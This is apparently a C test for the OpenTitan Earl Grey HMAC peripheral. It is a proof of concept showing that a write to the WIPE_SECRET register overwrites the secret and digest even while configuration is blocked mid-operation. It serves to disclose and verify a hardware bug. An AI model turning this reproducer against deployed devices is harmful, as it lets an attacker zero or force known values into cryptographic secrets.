#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"

#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "hmac_regs.h"

OTTF_DEFINE_TEST_CONFIG();

// POC demonstrating that a write to WIPE_SECRET triggers secret wiping even
// while configuration is blocked (cfg_block asserted). This reproduces the
// vulnerability described in report V20: assign wipe_secret = reg2hw.wipe_secret.qe;
// and the priority in update_secret_key which applies the wipe before the
// cfg_block check.

static const uint32_t kTestKey[8] = {
  0xec4e6c89, 0x082efa98, 0x299f31d0, 0xa4093822,
  0x03707344, 0x13198a2e, 0x85a308d3, 0x243f6a88,
};

bool test_main(void) {
  mmio_region_t hmac = mmio_region_from_addr(TOP_EARLGREY_HMAC_BASE_ADDR);

  LOG_INFO("HMAC WIPE during cfg_block POC start");

  // 1) Write a known non-zero key into the KEY registers.
  // The ordering follows the DIF: least significant word at KEY_7 offset.
  for (size_t i = 0; i < 8; ++i) {
    const ptrdiff_t word_offset = (ptrdiff_t)(i * sizeof(uint32_t));
    mmio_region_write32(hmac, HMAC_KEY_7_REG_OFFSET - word_offset, kTestKey[i]);
  }

  // 2) Prepare configuration: enable SHA/HMAC and set digest/key length fields.
  uint32_t cfg = mmio_region_read32(hmac, HMAC_CFG_REG_OFFSET);
  cfg = bitfield_field32_write(cfg, HMAC_CFG_DIGEST_SIZE_FIELD,
                                HMAC_CFG_DIGEST_SIZE_VALUE_SHA2_256);
  cfg = bitfield_field32_write(cfg, HMAC_CFG_KEY_LENGTH_FIELD,
                                HMAC_CFG_KEY_LENGTH_VALUE_KEY_256);
  cfg = bitfield_bit32_write(cfg, HMAC_CFG_SHA_EN_BIT, true);
  cfg = bitfield_bit32_write(cfg, HMAC_CFG_HMAC_EN_BIT, true);
  mmio_region_write32(hmac, HMAC_CFG_REG_OFFSET, cfg);

  // 3) Start HMAC operation. This should assert cfg_block inside the HW.
  mmio_region_nonatomic_set_bit32(hmac, HMAC_CMD_REG_OFFSET,
                                  HMAC_CMD_HASH_START_BIT);

  // 4) Wait for the core to leave idle (indicates the operation started and
  // cfg_block should be asserted). Poll with timeout to avoid infinite loop.
  const int kPollLimit = 1000000;
  int poll = 0;
  while (mmio_region_get_bit32(hmac, HMAC_STATUS_REG_OFFSET,
                               HMAC_STATUS_HMAC_IDLE_BIT) &&
         (poll++ < kPollLimit)) {
    // busy wait
  }

  CHECK(poll < kPollLimit, "Timeout waiting for HMAC core to start");
  LOG_INFO("HMAC core started (cfg_block should be asserted)");

  // 5) While cfg_block is expected to be asserted, write the WIPE_SECRET
  // register. According to the RTL bug, the write-event pulse (qe) drives
  // wiping without checking cfg_block, so this write must still zeroize or
  // deterministically set the secret.
  const uint32_t kWipeValue = 0xFFFFFFFFu;
  mmio_region_write32(hmac, HMAC_WIPE_SECRET_REG_OFFSET, kWipeValue);
  LOG_INFO("Wrote WIPE_SECRET = 0x%08x", kWipeValue);

  // 6) Read back the digest registers. As documented and used by the DIF, the
  // wipe operation propagates the wipe value into the digest CSRs. If the
  // digest words equal the wipe value, the wipe took effect despite
  // cfg_block.
  uint32_t digest[8];
  for (size_t i = 0; i < 8; ++i) {
    const ptrdiff_t off = HMAC_DIGEST_7_REG_OFFSET - (ptrdiff_t)(i * sizeof(uint32_t));
    digest[i] = mmio_region_read32(hmac, off);
  }

  for (uint32_t i = 0; i < 8; ++i)
  {
    CHECK(digest[i] == kWipeValue,
          "Digest[%d] expected wipe value 0x%08x, got 0x%08x", i,
          kWipeValue, digest[i]);
  }

  LOG_INFO("WIPE observed while cfg_block asserted: vulnerability reproduced");

  return true;
}
